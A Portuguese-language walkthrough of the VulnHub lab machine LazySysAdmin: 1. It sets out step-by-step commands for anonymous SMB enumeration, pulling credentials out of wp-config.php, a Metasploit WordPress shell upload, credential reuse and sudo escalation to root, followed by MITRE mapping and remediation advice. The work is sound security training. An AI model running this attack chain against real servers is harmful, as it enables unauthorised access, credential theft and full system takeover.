# LazySysAdmin: 1 — Quando o Sysadmin Literalmente Deixa as Chaves na Porta

Mano, essa máquina se chama LazySysAdmin e entrega exatamente o que promete. Sem mentira, véi, isso é uma aula magistral do que acontece quando alguém configura um servidor e simplesmente... não liga. Acesso SMB anônimo expondo arquivos-fonte do WordPress, senhas em texto puro em arquivos de configuração, reutilização de credenciais em três serviços e uma conta com sudo irrestrito. Cada achado aqui é uma má configuração do mundo real que aparece em ambientes de produção semanalmente. Dói olhar para isso do ponto de vista defensivo.

Salve ao Togie Mcdogie por criar essa máquina. O nome diz tudo.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | LazySysAdmin: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/lazysysadmin-1,205/ |
| **Técnicas** | Enumeração com Nmap, acesso SMB anônimo, exposição de arquivo de configuração WordPress, Metasploit wp_admin_shell_upload, pós-exploração com Meterpreter, reutilização de credenciais, escalação via sudo irrestrito |
| **CVEs** | CWE-284 (Controle de Acesso Impróprio: SMB anônimo), CWE-522 (Credenciais Insuficientemente Protegidas: wp-config.php no compartilhamento SMB), CWE-269 (Gestão Imprópria de Privilégios: sudo irrestrito para togie) |
| **Grupos APT** | FIN7: usa exploração de WordPress via acesso de credenciais admin como vetor primário de acesso inicial em targeting de setores de varejo e hospitalidade; APT28: abuso documentado de compartilhamentos de arquivos SMB para descoberta lateral de credenciais em intrusões de rede corporativa |

---

## Resumo do Ataque

```
netdiscover / nmap
  → portas: 22 (SSH), 80 (HTTP WordPress), 139/445 (Samba), 3306 (MySQL)
  → smbclient -L alvo → share$ (anônimo, sem senha)
  → smbclient share$ → get deets.txt → Password: 12345
  → smbclient share$ → cd wordpress → get wp-config.php
  → wp-config.php: DB_USER=Admin, DB_PASSWORD=TogieMYSQL12345^^
  → http://alvo/wordpress/wp-admin → admin:TogieMYSQL12345^^
  → Metasploit: exploit/unix/webapp/wp_admin_shell_upload
  → sessão Meterpreter → www-data
  → su togie (Senha: 12345 do deets.txt)
  → sudo -l → (ALL:ALL) ALL
  → sudo su → uid=0(root)
  → cat /root/proof.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas para identificar todos os serviços
2. Enumeração de compartilhamento SMB com acesso anônimo
3. Extração de arquivos: deets.txt (hint de senha) e wp-config.php (credenciais admin)
4. Login de admin WordPress com credenciais extraídas
5. Metasploit wp_admin_shell_upload para sessão Meterpreter
6. Movimento lateral para usuário togie via reutilização de credenciais
7. Enumeração de sudo e escalação via sudo irrestrito
8. Captura da flag de root

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Alvo: 192.168.56.X

nmap -p- -sV 192.168.56.X
```

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1
80/tcp   open  http        Apache httpd 2.4.7 (WordPress)
139/tcp  open  netbios-ssn Samba smbd 3.x-4.x
445/tcp  open  netbios-ssn Samba smbd 3.x-4.x
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
```

Múltiplos serviços. SMB (139/445) e HTTP (80, WordPress) são as superfícies de ataque principais.

**Nota real:** A presença do Samba em um servidor web deve imediatamente acender um sinal de alerta durante qualquer avaliação. Servidores web de produção raramente precisam de SMB exposto. O APT28 especificamente visa compartilhamentos SMB em ambientes corporativos para descoberta lateral de credenciais, consistente com o caminho de ataque desta máquina.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Acesso SMB Anônimo e Extração de Arquivos

Liste os compartilhamentos disponíveis:

```bash
smbclient -L 192.168.56.X
# Nenhuma senha necessária — pressione Enter
```

```
Sharename    Type    Comment
---------    ----    -------
print$       Disk    Printer Drivers
share$       Disk    Sumshare
IPC$         IPC     IPC Service
```

Conecte ao `share$` sem senha:

```bash
smbclient '\\192.168.56.X\share$'
# Senha: (vazia — pressione Enter)
```

Enumere e baixe tudo:

```bash
smb: \> ls
smb: \> get deets.txt
smb: \> get todolist.txt
smb: \> cd wordpress\
smb: \> get wp-config.php
smb: \> quit
```

Leia os arquivos:

```bash
cat deets.txt
# CBF Sysadmin
# ...
# Password: 12345

cat todolist.txt
# Ignore SSL, Fix WordPress, etc.
```

**Alternativa: enumere com enum4linux ou smbmap:**
```bash
enum4linux -a 192.168.56.X
smbmap -H 192.168.56.X
```

**Nota real:** Acesso SMB anônimo expondo diretórios de aplicações web é um achado crítico em toda avaliação de segurança interna. O arquivo wp-config.php em um compartilhamento Samba é o equivalente a deixar as chaves de casa na varanda da frente. Milhares de organizações ainda têm compartilhamentos Samba anônimos em suas redes internas, frequentemente de configurações legadas de compartilhamento de arquivos que nunca foram devidamente protegidas.

**MITRE ATT&CK:** T1135 — Descoberta de Compartilhamento de Rede; T1039 — Dados de Unidade Compartilhada de Rede

---

## Passo 3 — Extração de Credenciais do wp-config.php

```bash
cat wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

Duas credenciais extraídas:
- Admin WordPress/MySQL: `Admin` / `TogieMYSQL12345^^`
- Usuário SSH/sistema (do deets.txt): `togie` / `12345`

**MITRE ATT&CK:** T1552.001 — Credenciais Desprotegidas: Credenciais em Arquivos

---

## Passo 4 — Login de Admin WordPress

Acesse `http://192.168.56.X/wordpress/wp-admin/`:
- **Usuário:** `admin`
- **Senha:** `TogieMYSQL12345^^`

Login bem-sucedido. Acesso total de admin WordPress.

**MITRE ATT&CK:** T1078 — Contas Válidas: Contas Padrão

---

## Passo 5 — Upload de Shell WordPress via Metasploit

Com credenciais de admin, use o Metasploit para fazer upload de um plugin malicioso para acesso shell:

```bash
msfconsole -q
msf> use exploit/unix/webapp/wp_admin_shell_upload
msf> set RHOSTS 192.168.56.X
msf> set TARGETURI /wordpress
msf> set USERNAME admin
msf> set PASSWORD TogieMYSQL12345^^
msf> exploit
```

Sessão Meterpreter abre como `www-data`:

```bash
meterpreter > getuid
# Server username: www-data
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
id
# uid=33(www-data) gid=33(www-data)
```

**MITRE ATT&CK:** T1505.003 — Componente de Software de Servidor: Web Shell

---

## Passo 6 — Movimento Lateral para togie

A senha do `deets.txt` (`12345`) funciona para a conta de usuário `togie`:

```bash
su togie
# Senha: 12345
id
# uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),...
```

**Alternativamente, SSH diretamente:**
```bash
ssh togie@192.168.56.X
# Senha: 12345
```

**Nota real:** Reutilização de senha entre serviços é um dos habilitadores mais consistentes de movimento lateral em redes empresariais. Uma senha encontrada em um arquivo de configuração ou arquivo de texto quase sempre desbloqueia pelo menos uma conta de serviço adicional. É por isso que o credential spraying é tão eficaz: a maioria dos humanos reutiliza senhas, véi.

**MITRE ATT&CK:** T1078 — Contas Válidas; T1110.004 — Força Bruta: Credential Stuffing

---

## Passo 7 — Escalação de Privilégios via sudo Irrestrito

```bash
sudo -l
```

```
User togie may run the following commands on this host:
    (ALL : ALL) ALL
```

`togie` tem acesso sudo irrestrito a tudo, sem senha necessária. Escale diretamente:

```bash
sudo su
id
# uid=0(root) gid=0(root) groups=0(root)
```

Leia a flag:

```bash
cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root. O sysadmin preguiçoso selou seu próprio destino. GG mano, que absurdo!

**Nota real:** `(ALL:ALL) ALL` sudo irrestrito é a configuração sudo mais perigosa possível. Significa que a conta é funcionalmente equivalente ao root. O FIN7 e múltiplos grupos de ransomware especificamente enumeram `sudo -l` durante pós-exploração porque sudo irrestrito permite escalação imediata de privilégio sem nenhum código de exploit.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | togie:12345 | deets.txt no compartilhamento SMB | Acesso SSH e su |
| Credencial | admin:TogieMYSQL12345^^ | wp-config.php no compartilhamento SMB | Admin WordPress + MySQL |
| Meterpreter | www-data | Metasploit wp_admin_shell_upload | Web shell inicial |
| Shell root | uid=0(root) | sudo su (sudo irrestrito) | Acesso total ao sistema |
| Flag | /root/proof.txt | /root/ | Prova de comprometimento |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Takeaway Principal |
|---|---|---|---|
| 1 | Acesso SMB anônimo expõe arquivos de app web | Achado crítico em todo pentest interno; compartilhamentos SMB rotineiramente expõem wp-config.php, web.config, arquivos .env | Desabilite SMB anônimo; audite permissões de compartilhamento trimestralmente; nunca sirva arquivos de app web via SMB |
| 2 | wp-config.php contém credenciais de banco em texto puro | Arquivos de configuração WordPress são uma das principais fontes de credenciais para atacantes que ganham acesso ao sistema de arquivos ou compartilhamento | Restrinja permissões do wp-config.php (0400 ou 0440); coloque WordPress fora do web root quando possível |
| 3 | Reutilização de senha entre togie/admin/MySQL | Reutilização de credenciais é o habilitador nº 1 de movimento lateral em redes empresariais | Aplique senhas únicas por serviço; use um gerenciador de senhas ou solução PAM |
| 4 | sudo irrestrito concede root imediato | (ALL:ALL) ALL sudo = acesso root; comum em ambientes dev que acidentalmente viraram produção | Aplique sudo de menor privilégio; conceda apenas comandos específicos e necessários; sempre exija senha |
| 5 | Credenciais admin WordPress permitem RCE via plugin | Qualquer admin WordPress pode instalar plugins; instalação de plugin = execução de comando OS | Restrinja instalação de plugins; implemente checklist de endurecimento de segurança WordPress |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Coleta | Descoberta de Compartilhamento de Rede | T1135 |
| Acesso Inicial | Coleta | Dados de Unidade Compartilhada de Rede | T1039 |
| Acesso a Credenciais | Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Execução | Execução | Componente de Software de Servidor: Web Shell | T1505.003 |
| Movimento Lateral | Credenciais | Contas Válidas: Reutilização de Credenciais | T1078 |
| Escalação de Privilégios | Escalação | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilite SMB anônimo**: Adicione `map to guest = Never` no smb.conf; restrinja todos os compartilhamentos a usuários autenticados apenas
2. **Remova arquivos de app web dos compartilhamentos SMB**: wp-config.php e qualquer arquivo de configuração nunca devem ser acessíveis via compartilhamentos de arquivo
3. **Restrinja permissões do wp-config.php**: `chmod 640 /var/www/html/wordpress/wp-config.php`; idealmente mova-o acima do web root
4. **Aplique senhas únicas**: Rotacione todas as senhas; use uma solução PAM ou gerenciador de senhas; elimine reutilização de credenciais
5. **Restrinja sudo**: Conceda ao togie apenas os comandos específicos necessários; exija senha: `togie ALL=(root) /usr/bin/comando-específico`
6. **Endureça WordPress**: Restrinja instalação de plugins a administradores; implemente autenticação de dois fatores no wp-admin

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os compartilhamentos SMB; auditar permissões de compartilhamento trimestralmente |
| Proteger | Controle de Acesso | Desabilitar SMB anônimo; aplicar acesso autenticado a todos os compartilhamentos |
| Proteger | Segurança de Dados | Restringir permissões de arquivos de configuração; eliminar reutilização de credenciais |
| Detectar | Anomalias | Alertar em conexões SMB anônimas; monitorar uso de sudo -l e sudo su |
| Responder | Planejamento de Resposta | Desabilitar SMB anônimo imediatamente; rotacionar todas as credenciais expostas |
| Recuperar | Planejamento de Recuperação | Auditar todos os compartilhamentos SMB; revisar lista de contas admin WordPress; reconstruir se comprometido |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Sem acesso SMB anônimo; acesso autenticado exigido para todos os compartilhamentos de arquivo |
| AC-6 | Menor Privilégio | sudo do togie restrito a comandos específicos; exigir senha |
| IA-5 | Gestão de Autenticadores | Senhas únicas por serviço; rotacionar credenciais do wp-config.php |
| CM-7 | Menor Funcionalidade | Desabilitar SMB anônimo; restringir instalação de plugins WordPress |
| SC-28 | Proteção de Informação em Repouso | wp-config.php não acessível via compartilhamentos de rede |

### CISA KEV

Exploração de WordPress via credenciais de admin (padrão wp_admin_shell_upload) mapeia para múltiplas entradas da CISA KEV para plugins e temas WordPress com RCE autenticado. A BOD 23-02 da CISA aborda risco de interfaces de gerenciamento expostas na rede incluindo painéis de admin WordPress. Acesso SMB anônimo está alinhado com o Alerta CISA AA22-249A sobre sistemas mal configurados que permitem implantação de ransomware.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Identidades e Credenciais | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Configuração | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Endurecimento de Configuração de Aplicação (desabilitar SMB anônimo; restringir wp-config.php)
- **D3-OAM** — Gestão Administrativa do Sistema Operacional (sudo de menor privilégio; exigir senha)
- **D3-NTA** — Análise de Tráfego de Rede (detectar conexões SMB anônimas; alertar em acesso incomum a arquivos)

---

## Considerações Finais

LazySysAdmin é uma máquina perfeita para demonstrar como é uma "falha de defesa em profundidade". Não uma má configuração, não duas: cinco falhas de segurança distintas, cada uma habilitando o próximo passo. SMB anônimo te dá credenciais, credenciais te dão admin WordPress, admin WordPress te dá shell, o shell te dá reutilização de credenciais, reutilização de credenciais te dá sudo, sudo te dá root. Remova qualquer uma dessas e a cadeia quebra.

A máquina se chama LazySysAdmin por uma razão. No mundo real, esse perfil é chocantemente comum: um ambiente dev que virou produção sem uma revisão de segurança, um arquivo de configuração que era para ser temporário, uma regra sudo que era "só para testes." Enumeração metódica vence exploits inteligentes toda vez em máquinas como essa.

Sensacional demais essa máquina, véi!

Thanks guys!! (❍ᴥ❍ʋ)
